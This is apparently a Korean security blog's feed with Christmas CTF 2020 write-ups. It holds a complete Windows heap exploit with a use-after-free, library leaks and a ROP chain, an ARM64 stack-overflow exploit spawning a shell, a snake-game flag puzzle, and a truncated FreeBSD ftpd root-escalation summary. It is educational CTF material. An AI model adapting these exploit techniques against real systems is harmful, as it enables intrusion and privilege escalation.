class="hljs-keyword">def</span> <span class="hljs-title">deleteAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restoreAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifyAddr</span>(<span class="hljs-params">idx, item, new</span>):</span>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(item))p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(new)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-number">55555</span>)print(p.recv())p.sendline(<span class="hljs-string">&quot;L0ch&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<span class="hljs-comment"># node 3-&gt;4 , node 4-&gt;3</span>deleteAddr(<span class="hljs-number">4</span>)deleteAddr(<span class="hljs-number">3</span>)restoreAddr(<span class="hljs-number">4</span>)restoreAddr(<span class="hljs-number">3</span>)<span class="hljs-comment"># reference count ingeter overflow - free addressbook</span>listAddr(<span class="hljs-number">3275</span>)<span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&apos;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&apos;&gt;&apos;</span>)pivot = ntdll + <span class="hljs-number">0xA0E24</span> <span class="hljs-comment"># mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</span>ret = ntdll + <span class="hljs-number">0x144F</span>add_rsp_28h = ntdll + <span class="hljs-number">0x3EDC</span>ppr = ntdll + <span class="hljs-number">0x8B8F0</span> <span class="hljs-comment"># pop rdx rcx r8 r9 r10 r11 ret</span>read = ucrtbase + <span class="hljs-number">0x17BC0</span>write = ucrtbase + <span class="hljs-number">0x174C0</span> <span class="hljs-comment"># pivot</span>payload = p64(pivot)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ret)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)<span class="hljs-comment"># arg 2, buffer </span>payload += p64(<span class="hljs-number">0x3</span>)<span class="hljs-comment"># arg 1, fd</span>payload += p64(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># arg 3, size</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(read)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># write flag</span>payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)payload += p64(<span class="hljs-number">1</span>)payload += p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(write)<span class="hljs-comment"># overwrite vtable</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,p64(obj_leak+<span class="hljs-number">152</span>))p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;-1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(p64(obj_leak+<span class="hljs-number">152</span>))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">136</span>+p64(obj_leak+<span class="hljs-number">168</span>)+payload)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;6&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recv())</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - baby-RudOlPh</title>
    <link href="/2020/12/29/l0ch/baby_rudolph/"/>
    <url>/2020/12/29/l0ch/baby_rudolph/</url>
    
    <content type="html"><![CDATA[<p>baby_RudOlPh&#xB294; baby &#xC2DC;&#xB9AC;&#xC988; &#xB2F5;&#xAC8C; &#xC774;&#xBC88; Christmas CTF&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB9CE;&#xC740; &#xC194;&#xBC84;&#xAC00; &#xB098;&#xC654;&#xB358; &#xBB38;&#xC81C; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png" alt></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBC1B;&#xACE0; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xACFC; &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; 64bit ARM&#xC774;&#xACE0;, NX bit&#xB9CC; &#xAC78;&#xB824;&#xC788;&#xB294;&#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/2.png" alt><br>&#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; vuln&#xC774;&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xB300;&#xB193;&#xACE0; &#xC90D;&#xB2C8;&#xB2E4;. read &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370; 0x100&#xB9CC;&#xD07C; &#xBC1B;&#xC544;&#xC11C; stack overwflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB124;&#xC694;</p><p><img src="/2020/12/29/l0ch/baby_rudolph/3.png" alt></p><p><code>get_arm</code> &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; &#xAC12;&#xC774; <code>0x1225</code> &#xBA74; <code>system(&quot;/bin/sh&quot;)</code>&#xC744; &#xC2E4;&#xD589;&#xD574; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/4.png" alt></p><p><code>ARMmaker</code> &#xD568;&#xC218;&#xC5D0;&#xB294; &#xC778;&#xC790;&#xB97C; &#xC138;&#xD305; &#xD560; &#xC218; &#xC788;&#xB294; gadget&#xC774; &#xC788;&#xB124;&#xC694;.</p><ol><li><code>vuln</code> &#xC758; return address&#xB97C; <code>ARMmaker</code>&#xC758; gadget&#xC73C;&#xB85C; overwrite</li><li>gadget&#xC744; &#xD1B5;&#xD574; &#xC778;&#xC790;&#xB97C; <code>0x1225</code>&#xB85C; &#xC138;&#xD305;&#xD558;&#xACE0; <code>get_arm</code> &#xD638;&#xCD9C;</li><li>get shell!</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = process(<span class="hljs-string">&quot;./baby_RudOlPh&quot;</span>)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p.recvuntil(<span class="hljs-string">&quot;\\n&quot;</span>)payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">72</span>payload += p64(<span class="hljs-number">0x400724</span>)payload += p64(<span class="hljs-number">0x1225</span>) + <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">16</span>payload += p64(<span class="hljs-number">0x400738</span>)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/29/l0ch/baby_rudolph/5.png" alt></p><p>&#xB274;&#xBE44;&#xC6A9; &#xD3EC;&#xB108;&#xBE14; &#xBB38;&#xC81C;&#xB97C; &#xB0B4;&#xB824;&#xB294;&#xB370; &#xADF8;&#xB0E5; &#xB0B4;&#xBA74; &#xC2EC;&#xC2EC;&#xD574;&#xC11C; 64bit ARM&#xC73C;&#xB85C; &#xB0B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xC5ED;&#xC2DC; &#xB9CE;&#xC740; &#xBD84;&#xB4E4;&#xC774; &#xD480;&#xC5B4;&#xC8FC;&#xC168;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p>(&#xBB38;&#xC81C; &#xB9CC;&#xB4DC;&#xB294; &#xC2DC;&#xAC04;&#xBCF4;&#xB2E4; &#xB3C4;&#xCEE4;&#xC5D0; &#xC138;&#xD305;&#xD558;&#xB294;&#xB370; &#xB4DC;&#xB294; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xC624;&#xB798; &#xAC78;&#xB838;&#xB358; &#xAC74; &#xBE44;&#xBC00;..)</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Picky Eater</title>
    <link href="/2020/12/29/l0ch/picky_eater/"/>
    <url>/2020/12/29/l0ch/picky_eater/</url>
    
    <content type="html"><![CDATA[<p>picky_eater&#xB294; snake game&#xC744; &#xC708;&#xB3C4;&#xC6B0; &#xCF58;&#xC194;&#xB85C; &#xAD6C;&#xD604;&#xD55C; &#xBBF8;&#xC2A4;&#xD06C; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC61B;&#xB0A0;&#xC61B;&#xB0A0;&#xC5D0; &#xBA39;&#xACE0;&#xC2F6;&#xC740; &#xAC83;&#xB9CC; &#xBA39;&#xB294; &#xD3B8;&#xC2DD;&#xC7C1;&#xC774; &#xBC40;&#xC774; &#xC788;&#xC5C8;&#xC5B4;&#xC694; &#xD3B8;&#xC2DD;&#xC7C1;&#xC774; &#xBC40;&#xC740; &#xBA39;&#xAE30; &#xC2EB;&#xC740;&#xAC78; &#xBA39;&#xC73C;&#xBA74; &#xD2F0;&#xB97C; &#xB0B8;&#xB2F5;&#xB2C8;&#xB2E4;!</p></blockquote><p>&#xC704;&#xC640; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xC758; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xC158;&#xACFC; &#xD568;&#xAED8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC8FC;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/picky_eater/1.png" alt></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC740; &#xD654;&#xBA74;&#xC774; &#xB098;&#xC624;&#xB294;&#xB370;, &#xC544;&#xBB34;&#xD0A4;&#xB098; &#xB204;&#xB974;&#xBA74; snake &#xAC8C;&#xC784;&#xC774; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;.</p><p>snake &#xAC8C;&#xC784;&#xC758; &#xB8F0;&#xC740; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;! &#xCC98;&#xC74C;&#xC5D4; &#xC9E7;&#xC740; &#xAE38;&#xC774;&#xC758; &#xBC40;&#xC774; &#xB098;&#xC624;&#xB294;&#xB370;, &#xC774; &#xBC40;&#xC744; &#xCEE8;&#xD2B8;&#xB864;&#xD574; &#xD654;&#xBA74;&#xC0C1;&#xC5D0; &#xB098;&#xC624;&#xB294; &#xBA39;&#xC774;&#xB97C; &#xBA39;&#xC73C;&#xBA74; &#xBC40; &#xAE38;&#xC774;&#xAC00; &#xAE38;&#xC5B4;&#xC9C0;&#xACE0; &#xBC40;&#xC758; &#xC18D;&#xB3C4;&#xAC00; &#xBE68;&#xB77C;&#xC9C0;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xB8F0;&#xC774;&#xC8E0;</p><p><img src="/2020/12/29/l0ch/picky_eater/2.png" alt></p><p>&#xBC40;&#xC758; &#xBA39;&#xC774;&#xB85C;&#xB294; &#xBB38;&#xC790;&#xAC00; &#xD558;&#xB098;&#xC529; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xBB38;&#xC790;&#xB4E4;&#xC744; &#xD558;&#xB098;&#xC529; &#xBAA8;&#xC544;&#xBCF4;&#xBA74;<code>XMAS{$0lo_P1ickyY_$n@4k3?!}</code> &#xB77C;&#xB294; &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xB098;&#xC624;&#xB294;&#xB370;, &#xC774; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC778;&#xC99D;&#xD558;&#xBA74; &#xC778;&#xC99D;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC9C4;&#xC9DC; &#xD50C;&#xB798;&#xADF8;&#xB294; &#xAC8C;&#xC784;&#xC758; &#xADDC;&#xCE59;&#xC744; &#xD1B5;&#xD574; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294;&#xB370;, &#xBB38;&#xC81C;&#xC758; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xC158;&#xC744; &#xB2E4;&#xC2DC; &#xD55C; &#xBC88; &#xBCFC;&#xAE4C;&#xC694;?</p><blockquote><p>&#xC61B;&#xB0A0;&#xC61B;&#xB0A0;&#xC5D0; &#xBA39;&#xACE0;&#xC2F6;&#xC740; &#xAC83;&#xB9CC; &#xBA39;&#xB294; &#xD3B8;&#xC2DD;&#xC7C1;&#xC774; &#xBC40;&#xC774; &#xC788;&#xC5C8;&#xC5B4;&#xC694; &#xD3B8;&#xC2DD;&#xC7C1;&#xC774; &#xBC40;&#xC740; &#xBA39;&#xAE30; &#xC2EB;&#xC740;&#xAC78; &#xBA39;&#xC73C;&#xBA74; &#xD2F0;&#xB97C; &#xB0B8;&#xB2F5;&#xB2C8;&#xB2E4;!</p></blockquote><p>&#xBA39;&#xC774;&#xB97C; &#xBA39;&#xC73C;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBCC0;&#xD654;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xAE38;&#xC774;&#xAC00; &#xAE38;&#xC5B4;&#xC9D0;</li><li>&#xC18D;&#xB3C4;&#xAC00; &#xBE68;&#xB77C;&#xC9D0;</li></ol><p>&#xC18D;&#xB3C4;&#xB294; &#xC721;&#xC548;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B8; &#xAC83; &#xAC19;&#xC73C;&#xB2C8;, &#xAE38;&#xC774;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xADDC;&#xCE59;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xBA70; &#xD50C;&#xB808;&#xC774;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xCC98;&#xC74C; &#xAE38;&#xC774;&#xB294; &#xBA38;&#xB9AC;&#xB97C; &#xC81C;&#xC678;&#xD558;&#xACE0; 4&#xCE78;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/picky_eater/3.png" alt></p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xBA39;&#xC774;&#xC778; <code>X</code> &#xB97C; &#xBA39;&#xACE0; P&#xB85C; &#xC77C;&#xC2DC;&#xC815;&#xC9C0;&#xB97C; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC40;&#xC758; &#xAE38;&#xC774;&#xAC00; 6&#xC73C;&#xB85C; &#xB450; &#xCE78; &#xAE38;&#xC5B4;&#xC84C;&#xB124;&#xC694;. &#xC774;&#xB807;&#xAC8C; <code>XMAS{$</code> &#xAE4C;&#xC9C0; &#xBA39;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/l0ch/picky_eater/4.png" alt></p><p>&#xAE38;&#xC774;&#xAC00; 16&#xC774;&#xB2C8;&#xAE4C; XMAS{$ &#xB97C; &#xBA39;&#xC5C8;&#xC744;&#xB550; &#xBAA8;&#xB450; &#xAE38;&#xC774;&#xAC00; &#xAE38;&#xC5B4;&#xC9C4; &#xAC83;&#xC744; &#xD655;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2020/12/29/l0ch/picky_eater/5.png" alt></p><p>&#xADF8;&#xB7EC;&#xB098; <code>0</code> &#xC744; &#xBA39;&#xC5C8;&#xC744;&#xB54C;&#xB294; &#xAE38;&#xC774;&#xAC00; 16 &#xADF8;&#xB300;&#xB85C;&#xAD70;&#xC694;. &#xC774;&#xB807;&#xAC8C;  <code>XMAS{$0lo_P1ickyY_$n@4k3?!}</code> &#xC911; &#xBA39;&#xC5C8;&#xC744; &#xB54C; &#xAE38;&#xC774;&#xAC00; &#xB298;&#xC5B4;&#xB098;&#xC9C0; &#xC54A;&#xB294; &#xBB38;&#xC790;&#xB97C; &#xBE7C;&#xBA74; <code>XMAS{$o_P1cky_$n4k3!}</code> &#xB77C;&#xB294; &#xC9C4;&#xC9DC; &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xB098;&#xC624;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><p><img src="/2020/12/29/l0ch/picky_eater/6.png" alt></p><p>&#xCC38;&#xACE0;&#xB85C; IDA&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; fake flag&#xAC00; &#xC788;&#xACE0;</p><p><img src="/2020/12/29/l0ch/picky_eater/7.png" alt></p><p>&#xD50C;&#xB798;&#xADF8; index &#xAC00; &#xC788;&#xB294; &#xBC30;&#xC5F4;&#xC774; &#xC788;&#xC5B4; &#xC774;&#xAC78; &#xBCF4;&#xACE0; &#xD480;&#xC5B4;&#xB3C4; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xB2F4;&#xC73C;&#xB85C;.. fake flag&#xB97C; &#xB108;&#xBB34; &#xC9C4;&#xC9DC;&#xCC98;&#xB7FC; &#xB123;&#xC5B4;&#xB193;&#xB294; &#xBC14;&#xB78C;&#xC5D0;.. picky_eater&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC790;&#xB9C8;&#xC790; &#xD50C;&#xB798;&#xADF8; &#xC778;&#xC99D;&#xC694;&#xCCAD;&#xACFC; &#xBB38;&#xC758;&#xAC00; &#xD3ED;&#xC8FC;&#xD574;&#xC11C; &#xC815;&#xC2E0;&#xC744; &#xBABB;&#xCC28;&#xB838;&#xC5C8;&#xB124;&#xC694; &#xD558;&#xD558;..</p><p><img src="/2020/12/29/l0ch/picky_eater/8.png" alt></p><blockquote><p>&#xAC04;&#xB2E8;&#xC694;&#xC57D;&#xC9E4; - picky_eater &#xACF5;&#xAC1C; 10&#xBD84; &#xB4A4; &#xBB38;&#xC81C; &#xBCC4; &#xD50C;&#xB798;&#xADF8; &#xC778;&#xC99D;&#xC694;&#xCCAD;&#xD69F;&#xC218;(&#xD0DC;&#xADF8; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;)</p></blockquote><p>&#xD50C;&#xB798;&#xADF8; &#xC778;&#xC99D; &#xAD00;&#xB828;&#xD574;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xB2E4;&#xB294; &#xACF5;&#xC9C0;&#xB97C; &#xC62C;&#xB9B0; &#xC774;&#xD6C4; &#xB9CE;&#xC740; &#xD300;&#xB4E4;&#xC774; &#xD480;&#xC5B4;&#xC8FC;&#xC168;&#xC9C0;&#xB9CC;, &#xBB38;&#xC81C; &#xCD9C;&#xC81C; &#xC911; &#xBBF8;&#xCC98; &#xC0DD;&#xAC01; &#xBABB;&#xD55C; &#xC810; &#xB54C;&#xBB38;&#xC5D0; &#xCC38;&#xAC00;&#xC790;&#xBD84;&#xB4E4;&#xAED8; &#xD63C;&#xB780;&#xC744; &#xB4DC;&#xB824; &#xBC18;&#xC131;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x3160;&#x3160;&#x3160;</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-7468: FreeBSD local privilege escalation</title>
    <link href="/2020/12/29/l0ch/2020-12-29/"/>
    <url>/2020/12/29/l0ch/2020-12-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/12/21/cve-2020-7468-turning-imprisonment-to-advantage-in-the-freebsd-ftpd-chroot-jail">CVE-2020-7468: TURNING IMPRISONMENT TO ADVANTAGE IN THE FREEBSD FTPD CHROOT JAIL</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>FreeBSD ftpd</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>FreeBSD&#xC758; ftp &#xB370;&#xBAAC;&#xC5D0;&#xC11C; root &#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>chroot</code> &#xD568;&#xC218;&#xC758; &#xB85C;&#xADF8;&#xC778; &#xCC98;&#xB9AC; &#xBD80;&#xBD84;&#xC758; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>chroot</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>chdir</code>&#xC774; &#xC2E4;&#xD328;&#xD560; &#xACBD;&#xC6B0; ftpd&#xB294; <code>chroot</code>&#xC758; jail&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xB85C;&#xADF8;&#xC778; &#xC5F0;&#xACB0;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xAC15;&#xC81C;&#xB85C; <code>chdir</code>&#xC774; &#xC2E4;&#xD328;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xAC00; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC744; &#xC2DC;&#xC2A4;&#xD15C; &#xD30C;&#xC77C;&#xC778; &#xAC83;&#xCC98;&#xB7FC; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC0C1;&#xC138; &#xACF5;&#xACA9; &#xB2E8;&#xACC4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD574;&#xCEE4;&#xAC00; FTP &#xC720;&#xC800; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>etc/spwd.db</code> &#xC5D0; &#xC784;&#xC758;&#xC758; root &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC124;&#xC815;&#xD574; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>chmod 0</code> &#xC73C;&#xB85C; &#xD648; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xACE0; &#xC720;&#xC800; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB2E4;&#xC2DC; 